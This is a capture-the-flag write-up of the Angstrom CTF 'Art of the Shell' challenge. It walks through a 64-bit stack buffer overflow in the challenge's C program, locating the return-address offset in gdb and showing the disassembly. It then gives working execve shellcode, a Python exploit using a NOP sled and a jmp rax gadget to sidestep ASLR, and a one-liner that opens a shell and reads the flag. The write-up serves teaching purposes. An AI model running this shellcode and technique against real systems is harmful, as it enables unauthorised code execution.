# Angstrom CTF Art of the Shell writeup

> **Source:** Originally published at https://gb-sn.github.io/angstrom-ctf-art-of-the-shell-writeup.html
> **Author:** Original author (personal blog / CTF team archive)
> **Retrieved:** 2026-07-13
> **Word count:** 2212
> **Images:** 1 embedded locally

---

gbsn – Angstrom CTF Art of the Shell writeup


      ![](images/img_1.jpg)


#


#


Last week, from 22nd to 29th of May, Angstrom CTF was running. Unfortunately I didn't have much time to participate but I did manage to solve the Art of the Shell challenge.


Here's the description:

>


Looks like this program has a buffer overflow vulnerability! But there's no code inside that spawns a shell, so it must be secure! Get the flag anyway by exploiting it on our shell sever. The problem is available as: binary and source.


The challenge author was generous enough to give us the source code alongside the binary.

```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
```

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void be_nice_to_people()
{
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

void vuln(char *input)
{
    char buf[64];
    strcpy(buf, input);
}

int main(int argc, char **argv)
{
    if (argc != 2)
    {
        printf("Usage: art_of_the_shell [str]\n");
        return 1;
    }

    be_nice_to_people();
    vuln(argv[1]);

    return 0;
}

```


There's an obvious vulnerability at line *14 in the aptly named vuln function which uses `strcpy` to copy our input from the first command line argument into the buf character array. For those who don't know, `strcpy` doesn't bound-check the input which means we can overflow the 64 bytes of buf and continue overwriting data on the stack.


Let's have a look at the actual binary. Using pwntools checksec, we can view the security mitigations the binary has been compiled with.

```
$ file art_of_the_shell
art_of_the_shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=ad5f009fab7e9dbe9094f15cdeb42737e74d6233, not stripped
$ checksec art_of_the_shell
[*] '/home/gbsn/ctf/angstrom/pwn/art/art_of_the_shell'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)

```


Now we know that it's a x86-64 elf binary with no NX, no PIE and no stack canaries.


In this case we have access to the source code but I always like to make a habit of opening up binaries in everyones favorite disassembler (hint: it's **radare2) and poke around. Running radare2 with -AA will autoanalyze the binary.

```
$ r2 -AA art_of_the_shell
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Emulate code to find computed references (aae)
[x] Analyze consecutive function (aat)
[x] Type matching analysis for all functions (afta))unc.* functions (aan)
[x] Type matching analysis for all functions (afta)
 -- A C program is like a fast dance on a newly waxed dance floor by people carrying razors - Waldi Ravens
[0x00400510]> pdf @ main
            ;-- main:
┌ (fcn) main 74
│   main ();
│           ; var int local_10h @ rbp-0x10
│           ; var int local_4h @ rbp-0x4
│              ; DATA XREF from 0x0040052d (entry0)
│           0x00400657      55             push rbp
│           0x00400658      4889e5         mov rbp, rsp
│           0x0040065b      4883ec10       sub rsp, 0x10
│           0x0040065f      897dfc         mov dword [local_4h], edi
│           0x00400662      488975f0       mov qword [local_10h], rsi
│           0x00400666      837dfc02       cmp dword [local_4h], 2     ; [0x2:4]=0x102464c
│       ┌─< 0x0040066a      7411           je 0x40067d
│       │   0x0040066c      bf34074000     mov edi, str.Usage:_art_of_the_shell__str_ ; "Usage: art_of_the_shell [str]" @ 0x400734 ; const char * s
│       │   0x00400671      e84afeffff     call sym.imp.puts          ; int puts(const char *s)
│       │   0x00400676      b801000000     mov eax, 1
│      ┌──< 0x0040067b      eb22           jmp 0x40069f
│      │└─> 0x0040067d      b800000000     mov eax, 0
│      │    0x00400682      e87fffffff     call sym.be_nice_to_people
│      │    0x00400687      488b45f0       mov rax, qword [local_10h]
│      │    0x0040068b      4883c008       add rax, 8
│      │    0x0040068f      488b00         mov rax, qword [rax]
│      │    0x00400692      4889c7         mov rdi, rax
│      │    0x00400695      e89bffffff     call sym.vuln
│      │    0x0040069a      b800000000     mov eax, 0
│      │       ; JMP XREF from 0x0040067b (main)
│      └──> 0x0040069f      c9             leave
└           0x004006a0      c3             ret
[0x00400510]> pdf @ sym.vuln
┌ (fcn) sym.vuln 34
│   sym.vuln ();
│           ; var int local_48h @ rbp-0x48
│           ; var int local_40h @ rbp-0x40
│              ; CALL XREF from 0x00400695 (main)
│           0x00400635      55             push rbp
│           0x00400636      4889e5         mov rbp, rsp
│           0x00400639      4883ec50       sub rsp, 0x50               ; 'P'
│           0x0040063d      48897db8       mov qword [local_48h], rdi
│           0x00400641      488b55b8       mov rdx, qword [local_48h]
│           0x00400645      488d45c0       lea rax, [local_40h]
│           0x00400649      4889d6         mov rsi, rdx                ; const char * src
│           0x0040064c      4889c7         mov rdi, rax                ; char * dest
│           0x0040064f      e85cfeffff     call sym.imp.strcpy        ; char *strcpy(char *dest, const char *src)
│           0x00400654      90             nop
│           0x00400655      c9             leave
└           0x00400656      c3             ret
[0x00400510]> ? 0x48
72 0x48 0110 72 0000:0048 72 "H" 01001000 72.0 72.000000f 72.000000
[0x00400510]> ? 0x40
64 0x40 0100 64 0000:0040 64 "@" 01000000 64.0 64.000000f 64.000000

```


Looking at the disassembly of the vuln function we can see that it takes `rbp-0x48` as the source and `rbp-0x40` as the destination to `strcpy`. They correspond to `argv[1]` and `char buf[64]` in the source code.


An educated guesser would make the prediction that the offset between our buffer and the saved return address should be 72. But since we're all about empirical evidence here we should fire up a debugger and gather some facts.

```
$ gdb -q art_of_the_shell
Reading symbols from art_of_the_shell...(no debugging symbols found)...done.
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ run $(python -c 'print "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"')
Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffd950 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RBX: 0x0
RCX: 0x7fffffffdf40 --> 0x474458004c414136 ('6AAL')
RDX: 0x7fffffffd9b0 --> 0x4c414136 ('6AAL')
RSI: 0x50 ('P')
RDI: 0x7fffffffd950 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RBP: 0x4141334141644141 ('AAdAA3AA')
RSP: 0x7fffffffd998 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RIP: 0x400656 (<vuln+33>:   ret)
[...]
[-------------------------------------code-------------------------------------]
   0x40064f <vuln+26>:  call   0x4004b0 <strcpy@plt>
   0x400654 <vuln+31>:  nop
   0x400655 <vuln+32>:  leave
=> 0x400656 <vuln+33>:  ret
   0x400657 <main>: push   rbp
   0x400658 <main+1>:   mov    rbp,rsp
   0x40065b <main+4>:   sub    rsp,0x10
   0x40065f <main+8>:   mov    DWORD PTR [rbp-0x4],edi
[------------------------------------stack-------------------------------------]
[...]
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400656 in vuln ()
gdb-peda$ x/g $rsp
0x7fffffffd998: 0x4134414165414149
gdb-peda$ pattern offset 0x4134414165414149
4698452060381725001 found at offset: 72
gdb-peda$

```


Since the saved return address is the last thing remaining on the stack before a `RET` we know that at the current state, `RSP` contains our saved return address. Using peda's pattern toolset we can calculate the offset between the start of our buffer and the saved return address.


For the curious: The reason it SIGSEGVs when executing `RET` and not on the bytes from our pattern which overwrote the saved return address is because of x86-64's canonical form addresses, which you can read about here. Basically, we're trying to return to `0x4134414165414149` while the maximum canonical address is `0x00007FFFFFFFFFFF`.


Knowing this, we want to overwrite the 72 byte offset and another 6 bytes of the saved return address.

```
gdb-peda$ run $(python -c 'print "A"*72+"B"*6')
Starting program: /home/gbsn/ctf/angstrom/pwn/art/art_of_the_shell $(python -c 'print "A"*72+"B"*6')

Program received signal SIGSEGV, Segmentation fault.

[...]

Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000424242424242 in ?? ()
gdb-peda$

```


We've successfully changed the executing flow by getting the program to execute our supplied return address of `0x0000424242424242`. The next step is to run our own shellcode. What I usually do here is create a poc.py file where I can quickly edit and play around with the payload.


Our payload should be something like this:


`[nopsled] [shellcode] [offset] [saved return address]`


Since we know the offset to the saved return address is 72 we need the following.


`[20 bytes of nops] [27 bytes of shellcode] [25 bytes of A] [6 bytes of B]`


We can generate linux execve shellcode for the x86-64 architecture with **ragg2 which is part of the radare2 toolset.

```
$ ragg2 -i exec -b 64 -z
"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

```


My initial PoC looked like this.

```
import sys

sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0" \
     "\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f" \
     "\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" \

nops = "\x90"*20

p = ''
p += nops
p += sc
p += "A"*(72-len(nops)-len(sc))
p += "B"*6

sys.stdout.write(p)

```


The code should be fairly self-explanatory for anyone familiar with python. Let's execute our PoC in GDB and see what happens.

```
gdb-peda$ run $(python exploit.py)
Starting program: /home/gbsn/ctf/angstrom/pwn/art/art_of_the_shell $(python exploit.py)

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffd960 --> 0x9090909090909090
RBX: 0x0
RCX: 0x7fffffffdf40 --> 0x4458004242424242 ('BBBBB')
RDX: 0x7fffffffd9a9 --> 0xa800004242424242
RSI: 0x9 ('\t')
RDI: 0x7fffffffd960 --> 0x9090909090909090
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7fffffffd9b0 --> 0x7fffffffdaa8 --> 0x7fffffffdec7 ("/home/gbsn/ctf/angstrom/pwn/art/art_of_the_shell")
RIP: 0x424242424242 ('BBBBBB')

[...]

Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000424242424242 in ?? ()
gdb-peda$ x/20g $rsp - 80
0x7fffffffd960: 0x9090909090909090  0x9090909090909090
0x7fffffffd970: 0xbb48c03190909090  0xff978cd091969dd1
0x7fffffffd980: 0x52995f5453dbf748  0x41050f3bb05e5457
0x7fffffffd990: 0x4141414141414141  0x4141414141414141
0x7fffffffd9a0: 0x4141414141414141  0x0000424242424242
0x7fffffffd9b0: 0x00007fffffffdaa8  0x0000000200000000
0x7fffffffd9c0: 0x00000000004006b0  0x00007ffff7a2e830
0x7fffffffd9d0: 0x0000000000000000  0x00007fffffffdaa8
0x7fffffffd9e0: 0x00000002f7b99a28  0x0000000000400657
0x7fffffffd9f0: 0x0000000000000000  0x28cf2e865791d517

```


What we could do here is overwriting the saved return address with the start of our nopsled (`0x7fffffffd960`) on the stack. However, ASLR is enabled on the remote system making the starting stack address random each time the program is run.


Observing readers might have already noticed something interesting. `RAX` seems to point to the beginning our input. Instead of hardcoding the address of our nopsled on the stack, we could just simply find a way to call/ret/jmp to `RAX` which should start executing our nopsled and then our shellcode.


The reason this works is because when you compile a binary *without PIE (position-independent executable) the starting address of the **.TEXT section, which contains the programs executable instruction, does not get randomized on each run.


We'll use the handy **jmpcall command provided by peda to find a suitable opcode sequence.

```
gdb-peda$ jmpcall RAX
0x400565 : jmp rax
0x4005b3 : jmp rax
0x4005fe : call rax
0x600565 : jmp rax
0x6005b3 : jmp rax
0x6005fe : call rax
gdb-peda$

```


All we have to change with our initial PoC is adding the address of the `jmp rax` opcode sequence in reverse order (x86 is little endian).

```
from pwn import *
import sys

sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0" \
     "\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f" \
     "\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" \

nops = "\x90"*20


p = ''
p += nops
p += sc
p += "A"*(72-len(nops)-len(sc))
p += "\x60\x05\x65"[::-1] # 0x600565: jmp rax

sys.stdout.write(p)

```


Side note: I'm not sure why, but pwntools `p64()` packing function didn't work here. Halp!


Running this inside GDB should now spawn a shell!

```
gdb-peda$ run $(python exploit.py)
Starting program: /home/gbsn/ctf/angstrom/pwn/art/art_of_the_shell $(python exploit.py)
process 8637 is executing new program: /bin/dash
$ whoami
[New process 8642]
process 8642 is executing new program: /usr/bin/whoami
gbsn
[Inferior 2 (process 8642) exited normally]

```


**Bingo!


All I had to do now was convert the PoC to a python oneliner to be run in the CTF shell.

```
$ ./art_of_the_shell $(python -c 'print "\x90"*20 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "A"*25 + "\x60\x05\x65"[::-1]')
$ cat flag.txt
actf{****************************}
$

```


## Conclusion


We successfully exploited a stack-based buffer overflow on a x86-64 elf binary. We also bypassed ASLR by reusing code from the non-randomized .TEXT section and executed our own shellcode spawning a shell, from which we gained elevated privileges and was able to read the flag file.


      ctf
